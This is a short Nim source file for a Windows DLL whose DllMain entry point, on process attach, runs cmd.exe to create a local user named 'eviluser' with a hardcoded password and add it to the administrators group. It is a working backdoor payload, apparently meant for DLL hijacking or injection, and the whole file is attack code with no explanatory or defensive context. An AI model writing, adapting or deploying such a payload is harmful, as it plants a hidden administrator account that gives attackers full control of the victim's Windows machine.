import winim/lean
import osproc

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  
  if fdwReason == DLL_PROCESS_ATTACH:
    let outp_shell = execCmd("cmd.exe /C net user eviluser EviLS3cretP4ss! /add /y && net localgroup administrators eviluser /add /y")

  return true
